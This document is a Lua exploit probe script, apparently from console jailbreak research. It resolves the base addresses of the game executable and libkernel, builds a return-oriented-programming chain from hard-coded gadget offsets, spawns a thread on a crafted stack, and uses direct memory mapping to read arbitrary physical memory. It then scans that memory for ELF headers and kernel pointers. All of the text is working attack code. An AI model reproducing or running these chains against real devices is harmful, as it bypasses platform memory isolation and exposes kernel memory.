-- CRASH_CLASS: MODERATE
-- PROBE 561e: Child thread reads MapDM'd physical memory — NO SYSCALLS
--
-- 561b: MapDM accepts ALL physical addresses 0-16GB (rv=0)
-- 561d: NO syscall;ret in eboot, but fn_addr stub works (271g/384b)
-- This probe: child ROP chain uses ONLY memory gadgets:
--   mov rax,[rsi]; ret  (+0x1A5CC4) — read from mapped VA
--   mov [rdi],rax; ret  (+0x92C67)  — write to shared buffer
-- No sysarch, no thr_exit. Child writes data then crashes. Fine.
--
-- RSP formula from confirmed probes (271g/384b):
--   rsp = sb + ss - ((sb + ss) % 16) - 8
--   Chain written starting AT rsp.
--
-- TEST 1: Read GPU pool phys 0x0 (known good, we can verify)
-- TEST 2: Read phys 0x200000000 (8GB, outside pool)
-- TEST 3: Quick ELF scan at 256MB steps 1-8GB

print("=== PROBE 561e: CHILD PHYS READ (no syscall) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do
        pcall(function() memory.write_dword(buf + off, 0) end)
    end
end

local Z = uint64(0)
local sc20  = mk(20)
local sc73  = mk(73)
local sc477 = mk(477)
local sc455 = mk(455)
local sc593 = mk(593)

local pid = N(sc20())
print("pid=" .. pid)

-- Get eboot base
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(Z, info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Get libkernel base
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local mapdm_fn = lk + uint64(0x15020)
print(string.format("lk=0x%X%08X", lk_hi, lk_lo))

-- Gadgets
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rax_ret     = eboot + uint64(0x992)
local mov_rax_mem_rsi = eboot + uint64(0x1A5CC4)
local mov_mem_rdi_rax = eboot + uint64(0x92C67)
local bare_ret        = eboot + uint64(0x42)
io.flush()

-- ============================================================
-- read_phys: map phys page + child thread reads it
-- ============================================================
local mapped_va = uint64("0x880000000")

local function read_phys(phys_hi, phys_lo, num_qwords)
    local phys = uint64(string.format("0x%X%08X", phys_hi, phys_lo))
    local nq = math.min(num_qwords or 8, 16)

    -- Pre-map anonymous
    pcall(function()
        sc477(mapped_va, uint64(0x4000), uint64(3),
            uint64(0x1012), uint64(0xFFFFFFFF), Z)
    end)

    -- MapDM to physical
    local ok_md, rv_md = pcall(function()
        return native.fcall_with_rax(mapdm_fn, 0,
            mapped_va, uint64(0x4000), uint64(3), Z, phys, uint64(0x4000))
    end)
    local md_rv = ok_md and N(rv_md) or -999
    if md_rv ~= 0 then
        pcall(function() sc73(mapped_va, uint64(0x4000)) end)
        return nil, "mapdm rv=" .. md_rv
    end

    -- Shared result buffer (nq*8 + 8 for sentinel)
    local shared = memory.alloc(0x200)
    zero(shared, 0x200)

    -- Child stack
    local ss = 0x4000
    local ok_stk, sb = pcall(function()
        return sc477(Z, uint64(ss), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    if not ok_stk then
        pcall(function() sc73(mapped_va, uint64(0x4000)) end)
        return nil, "stack fail"
    end

    -- RSP from confirmed pattern (271g/384b)
    local sb_n = N(sb)
    local top = sb_n + ss
    local rsp_n = top - (top % 16) - 8
    local rsp = sb + uint64(rsp_n - sb_n)

    -- Build chain at rsp
    local ci = 0
    local function wc(val)
        wq(rsp + uint64(ci * 8), val)
        ci = ci + 1
    end

    -- Read nq qwords: pop_rsi → addr → mov rax,[rsi] → pop_rdi → dest → mov [rdi],rax
    for qi = 0, nq - 1 do
        wc(pop_rsi_ret)
        wc(mapped_va + uint64(qi * 8))
        wc(mov_rax_mem_rsi)
        wc(pop_rdi_ret)
        wc(shared + uint64(8 + qi * 8))
        wc(mov_mem_rdi_rax)
    end

    -- Write sentinel 0xDEADFACE to shared+0
    wc(pop_rax_ret)
    wc(uint64("0xDEADFACE"))
    wc(pop_rdi_ret)
    wc(shared)
    wc(mov_mem_rdi_rax)

    -- Ret sled (child crashes eventually, that's OK)
    for i = 1, 32 do wc(bare_ret) end

    -- thr_param (confirmed pattern: start_func=bare_ret)
    local pa = memory.alloc(0x40)
    zero(pa, 0x40)
    wq(pa + 0x00, bare_ret)          -- start_func
    wq(pa + 0x08, Z)                 -- arg
    wq(pa + 0x10, uint64(sb))        -- stack_base
    wq(pa + 0x18, uint64(ss))        -- stack_size
    local tid_buf = memory.alloc(8)
    wq(tid_buf, Z)
    wq(pa + 0x30, uint64(tid_buf))   -- child_tid

    -- Spawn child
    local ok_t, rv_t = pcall(function()
        return sc455(uint64(pa), uint64(0x38))
    end)
    local trv = ok_t and N(rv_t) or -999
    if trv ~= 0 then
        pcall(function() sc73(mapped_va, uint64(0x4000)) end)
        pcall(function() sc73(sb, uint64(ss)) end)
        return nil, "thr_new rv=" .. trv
    end

    -- Poll sentinel
    local sentinel = 0
    for wait = 1, 2000 do
        for j = 1, 200 do local x = j * j end
        sentinel = rb(shared) or 0
        if sentinel == 0xDEADFACE then break end
    end

    -- Read results
    local results = {}
    if sentinel == 0xDEADFACE then
        for qi = 0, nq - 1 do
            local lo = rb(shared + 8 + qi * 8) or 0
            local hi = rb(shared + 8 + qi * 8 + 4) or 0
            results[qi + 1] = {hi, lo}
        end
    end

    -- Cleanup
    pcall(function() sc73(mapped_va, uint64(0x4000)) end)
    pcall(function() sc73(sb, uint64(ss)) end)

    if sentinel ~= 0xDEADFACE then
        return nil, string.format("timeout sentinel=0x%X", sentinel)
    end
    return results, "OK"
end

-- ============================================================
-- TEST 1: GPU pool phys 0x0 (known good — dmem0 verified)
-- ============================================================
print("")
print("=== TEST 1: phys 0x00000000 (GPU pool) ===")
io.flush()

local r1, e1 = read_phys(0, 0, 8)
if r1 then
    print("  SENTINEL OK — child read physical memory!")
    for i, q in ipairs(r1) do
        local tag = ""
        if q[2] == 0x464C457F then tag = " *** ELF! ***" end
        print(string.format("  [+%02X] = 0x%08X%08X%s", (i-1)*8, q[1], q[2], tag))
    end
else
    print("  FAIL: " .. (e1 or "?"))
end
io.flush()

-- ============================================================
-- TEST 2: phys 0x200000000 (8GB — outside GPU pool)
-- ============================================================
print("")
print("=== TEST 2: phys 0x200000000 (8GB) ===")
io.flush()

local r2, e2 = read_phys(2, 0, 8)
if r2 then
    print("  SENTINEL OK — read OUTSIDE pool!")
    for i, q in ipairs(r2) do
        local tag = ""
        if q[2] == 0x464C457F then tag = " *** ELF! ***" end
        if q[1] >= 0xFFFF8000 then tag = tag .. " KPTR?" end
        print(string.format("  [+%02X] = 0x%08X%08X%s", (i-1)*8, q[1], q[2], tag))
    end
else
    print("  FAIL: " .. (e2 or "?"))
end
io.flush()

-- ============================================================
-- TEST 3: Quick ELF scan — 256MB steps, 1GB to 8GB
-- ============================================================
print("")
print("=== TEST 3: ELF scan 1-8GB (256MB steps) ===")
io.flush()

local elf_found = {}
for gi = 0, 27 do
    local phys_lo = 0x40000000 + gi * 0x10000000  -- 1GB + gi*256MB
    local phys_hi = 0
    while phys_lo >= 0x100000000 do
        phys_lo = phys_lo - 0x100000000
        phys_hi = phys_hi + 1
    end

    local r, err = read_phys(phys_hi, phys_lo, 1)
    if r and r[1] then
        local lo = r[1][2]
        local hi = r[1][1]
        local tag = ""
        if lo == 0x464C457F then
            tag = " *** ELF! ***"
            elf_found[#elf_found + 1] = {phys_hi, phys_lo}
        end
        if lo ~= 0 or hi ~= 0 then
            print(string.format("  0x%X%08X: 0x%08X%08X%s", phys_hi, phys_lo, hi, lo, tag))
        end
    else
        print(string.format("  0x%X%08X: %s", phys_hi, phys_lo, err or "?"))
    end

    if gi % 8 == 7 then io.flush() end
end

print(string.format("\nELF headers found: %d", #elf_found))

-- If ELF found, dump more data
for _, ef in ipairs(elf_found) do
    print(string.format("\n--- ELF at 0x%X%08X ---", ef[1], ef[2]))
    local r3, _ = read_phys(ef[1], ef[2], 16)
    if r3 then
        for i, q in ipairs(r3) do
            print(string.format("  [+%02X] = 0x%08X%08X", (i-1)*8, q[1], q[2]))
        end
    end
end

io.flush()
print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " DEAD"))
print("=== 561e DONE ===")
